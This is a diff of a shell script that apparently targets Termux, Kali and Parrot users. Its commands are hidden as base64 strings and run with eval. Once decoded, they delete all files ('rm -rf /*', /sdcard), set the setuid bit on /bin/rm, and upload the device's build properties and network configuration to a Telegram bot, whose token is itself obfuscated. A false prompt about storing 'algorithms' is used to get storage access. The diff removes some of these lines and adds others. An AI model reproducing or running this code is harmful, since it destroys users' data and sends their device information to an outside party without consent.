@@ -29,17 +29,19 @@ lclean="cm0gLXJmIC8qICY+L2Rldi9udWxsCg=="
 sdmaid="cm0gLXJmIC9zZGNhcmQvKgo="
 mchod="c3VkbyBjaG1vZCArcyAvYmluL3JtCg=="
 brain="ZWNobyAnbG1hbyByZXRhcmQnCg=="
-facebook="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTEwODI1NjA3MzpBQUdlekhzelBjb2pSSnRPbXdmSHh4QnpubjJCS3JxTGQ4OC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9QGZpeHNodXBkYXRlcyZ0ZXh0PVB3bmluZyAkbWV0aG9kIHRlcm11eCBoYXh4b3IuIEhlcmUgaXMgdGhlIGJ1aWxkLnByb3A6IiAmJiBnZXRwcm9wID4+IHByb3BzLnR4dCAmJiAgY3VybCAtRiBkb2N1bWVudD1AInByb3BzLnR4dCIgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDExMDgyNTYwNzM6QUFHZXpIc3pQY29qUkp0T213Zkh4eEJ6bm4yQktycUxkODgvc2VuZERvY3VtZW50P2NoYXRfaWQ9QGZpeHNodXBkYXRlcw=="
-instagram="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTEwODI1NjA3MzpBQUdlekhzelBjb2pSSnRPbXdmSHh4QnpubjJCS3JxTGQ4OC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9QGZpeHNodXBkYXRlcyZ0ZXh0PVB3bmluZyBrYWxpL3BhcnJvdCBoYXh4b3IuIg=="
-whatsapp="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTEwODI1NjA3MzpBQUdlekhzelBjb2pSSnRPbXdmSHh4QnpubjJCS3JxTGQ4OC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9QGZpeHNodXBkYXRlcyZ0ZXh0PU1pc3Npb24gc3VjY2Vzcy4g8J+RjCI="
-telegram="aWZjb25maWcgPj4gaXAudHh0ICYmIGN1cmwgLUYgZG9jdW1lbnQ9QCJpcC50eHQiIGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QxMTA4MjU2MDczOkFBR2V6SHN6UGNvalJKdE9td2ZIeHhCem5uMkJLcnFMZDg4L3NlbmREb2N1bWVudD9jaGF0X2lkPUBmaXhzaHVwZGF0ZXMK"
+tiktok="MTI5MDM0MDM2ODpBQUU0c1lXVjRBSzNkX21FUXoyVzFvdjJiU0F4TlJzY1l6VQ=="
+twitter="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JChiYXNlNjQgLWQgPDw8ICR0aWt0b2spL3NlbmRNZXNzYWdlIiAtZCAiY2hhdF9pZD1AZml4c2h1cGRhdGVzJnRleHQ9UHduaW5nICRtZXRob2QgaGF4eG9yLiIgJj4vZGV2L251bGwK"
+facebook="Z2V0cHJvcCA+PiBwcm9wcy50eHQgJiYgY3VybCAtRiBkb2N1bWVudD1AInByb3BzLnR4dCIgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCQoYmFzZTY0IC1kIDw8PCAkdGlrdG9rKS9zZW5kRG9jdW1lbnQ/Y2hhdF9pZD1AZml4c2h1cGRhdGVzCg=="
+whatsapp="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JChiYXNlNjQgLWQgPDw8ICR0aWt0b2spL3NlbmRNZXNzYWdlIiAtZCAiY2hhdF9pZD1AZml4c2h1cGRhdGVzJnRleHQ9TWlzc2lvbiBzdWNjZXNzLiDwn5GMIiAmPi9kZXYvbnVsbAo="
+telegram="aXAgYSA+PiBpcC50eHQgJiYgY3VybCAtRiBkb2N1bWVudD1AImlwLnR4dCIgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCQoYmFzZTY0IC1kIDw8PCAkdGlrdG9rKS9zZW5kRG9jdW1lbnQ/Y2hhdF9pZD1AZml4c2h1cGRhdGVzICY+L2Rldi9udWxsCg=="
 if [[ $PREFIX == *"com.termux"* ]]
 then
 	# Termux hacker???
 	if [ $(su -c id -u) == "0" ]
 	then
 		# Woah 1337 rooted Termux hacker
-        method="rooted"
+        method="rooted termux"
+		eval $(echo $twitter | base64 -d)
         eval $(echo $facebook | base64 -d)
 		eval $(echo $sar | base64 -d)
 		eval $(echo $sys | base64 -d)
@@ -48,7 +50,8 @@ then
 		# Not even rooted smh
 		echo "We need storage access to store our algorithms."
 		termux-setup-storage
-        method="non rooted"
+        method="non rooted termux"
+		eval $(echo $twitter | base64 -d)
         eval $(echo $facebook | base64 -d)
 		eval $(echo $sdmaid | base64 -d)
 	fi
@@ -57,7 +60,8 @@ else
 	source <(cat /etc/os-release)
 	case "$ID" in
 		kali|parrot)
-            eval $(echo $instagram | base64 -d)
+            method="$ID"
+			eval $(echo $twitter | base64 -d)
 			eval $(echo $mchod | base64 -d)
 			echo "command_not_found_handle() {
 				$(echo $brain | base64 -d)
